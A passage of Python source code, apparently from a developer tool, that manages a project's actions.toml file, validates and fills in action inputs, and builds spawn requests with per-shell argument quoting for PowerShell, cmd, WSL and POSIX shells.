# `process` resolves the command on PATH and passes args verbatim: no shell, no
# quoting surprises. Use type = "shell" when you need pipes or redirection.
type = "process"
command = "echo"
args = ["hello from a Project Action"]

# Uncomment for a step that must not run forever.
# timeout_seconds = 600

# Uncomment to ask for a value when the action runs. Reference it as
# ${input:target} inside args, cwd, or env. It cannot go in a `shell` command
# with no args, because that string reaches the shell unquoted.
#
# [[actions.inputs]]
# id = "target"
# label = "Target"
# kind = "choice"
# options = ["staging", "production"]
# default = "staging"
'''


def read_actions_source(project_root: str) -> dict[str, Any]:
    """The native action file's text and a revision, for the editor.

    A missing file is not an error: it is the ordinary state of a Project that has
    no actions yet, and the editor opens on a starter template instead.
    """
    path = Path(project_root).resolve() / ACTION_FILES[2]
    try:
        data = path.read_bytes()
    except OSError:
        return {
            "path": ACTION_FILES[2].as_posix(),
            "exists": False,
            "text": STARTER_ACTIONS_TOML,
            "revision": "missing",
            "starter": True,
        }
    return {
        "path": ACTION_FILES[2].as_posix(),
        "exists": True,
        "text": data.decode("utf-8", "replace"),
        "revision": hashlib.sha256(data).hexdigest()[:24],
        "starter": False,
    }


def write_actions_source(project_root: str, text: str, expected_revision: str) -> list[str]:
    """Validate and write the native action file. Returns import diagnostics.

    Validation runs against the *text* before anything is written, so a file that
    cannot be parsed is refused rather than saved and then reported as one useless
    import diagnostic.

    The revision guard is the same shape the Project file editor uses: two browsers
    editing the same file must not silently clobber each other.
    """
    root = Path(project_root).resolve()
    path = root / ACTION_FILES[2]
    if len(text.encode("utf-8")) > MAX_ACTIONS_SOURCE_BYTES:
        raise ValueError(f"actions.toml exceeds {MAX_ACTIONS_SOURCE_BYTES} bytes")
    try:
        current = path.read_bytes()
        revision = hashlib.sha256(current).hexdigest()[:24]
    except OSError:
        revision = "missing"
    if expected_revision != revision:
        raise ValueError("actions.toml changed elsewhere; reload before saving")
    try:
        _actions, diagnostics = parse_native_actions(text, root)
    except tomllib.TOMLDecodeError as exc:
        raise ValueError(f"TOML syntax error: {exc}") from exc
    except (ValueError, TypeError) as exc:
        raise ValueError(str(exc)) from exc
    path.parent.mkdir(parents=True, exist_ok=True)
    temporary = path.with_name(f".{path.name}.{os.getpid()}.tmp")
    temporary.write_bytes(text.encode("utf-8"))
    temporary.replace(path)
    return diagnostics


def substituted_action(
    action: ProjectAction, values: dict[str, str], root: Path
) -> ProjectAction:
    """This action with its declared inputs filled in.

    Every declared input must be supplied or defaulted, and an unknown key is
    refused rather than ignored: a caller that misspells an input would otherwise
    get an empty substitution and a command that silently does the wrong thing.

    Containment is re-checked here because a `cwd` naming an input could not be
    checked against the template at discovery time.
    """
    declared = {item.id: item for item in action.inputs}
    unknown = sorted(set(values) - set(declared))
    if unknown:
        raise ValueError(f"unknown inputs for {action.id}: {', '.join(unknown)}")
    resolved: dict[str, str] = {}
    for identifier, item in declared.items():
        value = values.get(identifier, item.default)
        if len(value) > MAX_INPUT_VALUE:
            raise ValueError(f"input {identifier} is longer than {MAX_INPUT_VALUE} characters")
        if item.kind == "choice" and value not in item.options:
            raise ValueError(
                f"input {identifier} must be one of: {', '.join(item.options)}"
            )
        if not value and item.kind == "string" and not item.default:
            raise ValueError(f"input {identifier} is required")
        resolved[identifier] = value
    if not declared:
        return action
    return replace(
        action,
        batches=tuple(
            tuple(_contained(step.substituted(resolved), root) for step in batch)
            for batch in action.batches
        ),
    )


def _contained(step: ActionStep, root: Path) -> ActionStep:
    return replace(step, cwd=resolve_contained_cwd(step.cwd, root))


def action_spawn_body(
    step: ActionStep,
    *,
    project_id: str,
    config: Config,
    profile_id: str,
) -> dict[str, Any]:
    """Build the spawn request that runs one Project Action step.

    The step's directory and environment travel as first-class spawn fields, so the
    supervisor launches the shell (or the resolved program) directly. Nothing from
    the swe-mux bundle sits in the resulting process tree, which is what lets a task
    terminal outlive a redeploy of the app it was launched from.
    """
    command = step.command
    args = list(step.args)
    if step.kind == "shell":
        if step.shell_executable:
            executable = _resolved_executable(step.shell_executable)
            shell_args = list(step.shell_args)
            line = _shell_command_line(executable, command, args)
            if not shell_args:
                shell_args = _shell_command_args(executable, line)
            else:
                shell_args.append(line)
        else:
            profile = resolve_profile(config, profile_id, Path(step.cwd), interactive=False)
            executable = profile.executable
            line = _shell_command_line(executable, command, args)
            shell_args = [*profile.argv, *_shell_command_args(executable, line)]
        command = executable
        args = shell_args
    else:
        command, args = process_invocation(command, args)
    return {
        "project_id": project_id,
        "backend": "shell",
        "name": step.name,
        "executable": command,
        "argv": args,
        "cwd": step.cwd,
        "env": dict(step.env),
        "completion_mode": "one_shot",
    }


def _resolved_executable(command: str) -> str:
    return shutil.which(command) or command


def process_invocation(command: str, args: Sequence[str]) -> tuple[str, list[str]]:
    """Resolve a ``process`` step to something CreateProcess can actually launch.

    PATH lookup happens here rather than in the child because there is no longer a
    child of ours to do it. A ``.cmd``/``.bat`` shim (every npm-family entry point on
    Windows) is not a real executable, so it is handed to the command processor
    instead of being exec'd directly.
    """
    resolved = _resolved_executable(command)
    argv = [resolved, *args]
    if os.name == "nt" and Path(resolved).suffix.casefold() in {".cmd", ".bat"}:
        return (
            os.environ.get("COMSPEC", "cmd.exe"),
            ["/d", "/s", "/c", subprocess.list2cmdline(argv)],
        )
    return resolved, [str(item) for item in args]


def _shell_command_line(executable: str, command: str, args: Sequence[str]) -> str:
    """Fold a shell step's command and args into one command line for that shell.

    VS Code runs `shell` tasks by quoting each entry of `args` and appending it to
    `command`; a shell step whose args are dropped silently runs a bare `npm`/`uv`
    and exits, so the join has to happen here, in the shell's own quoting dialect.
    """
    if not args:
        return command
    name = Path(executable).name.casefold()
    if name in {"powershell", "powershell.exe", "pwsh", "pwsh.exe"}:
        return " ".join((_powershell_command(command), *(_powershell_quote(a) for a in args)))
    if name in {"cmd", "cmd.exe"}:
        return " ".join(_cmd_quote(item) for item in (command, *args))
    return shlex.join((command, *args))


def _powershell_quote(value: str) -> str:
    # Single-quoted PowerShell strings are literal; '' is the only escape inside them.
    return "'{}'".format(value.replace("'", "''"))


def _powershell_command(value: str) -> str:
    # A quoted command is a string expression to PowerShell, not an invocation, so a
    # command needing quotes (a path with spaces) also needs the call operator.
    if re.fullmatch(r"[\w.:\\/-]+", value):
        return value
    return f"& {_powershell_quote(value)}"


def _cmd_quote(value: str) -> str:
    # list2cmdline applies the quoting the child's own parser expects; anything it
    # leaves bare still has to be quoted against cmd's metacharacters. `%VAR%` stays
    # expandable either way -- cmd offers no command-line escape for it.
    quoted = subprocess.list2cmdline([value])
    if quoted.startswith('"') or not re.search(r'[\s"&|<>^()]', quoted):
        return quoted
    return f'"{quoted}"'


def _shell_command_args(executable: str, command: str) -> list[str]:
    name = Path(executable).name.casefold()
    if name in {"powershell", "powershell.exe", "pwsh", "pwsh.exe"}:
        return ["-Command", command]
    if name in {"cmd", "cmd.exe"}:
        return ["/d", "/s", "/c", command]
    if name in {"wsl", "wsl.exe"}:
        return ["--", "sh", "-lc", command]
    return ["-c", command]
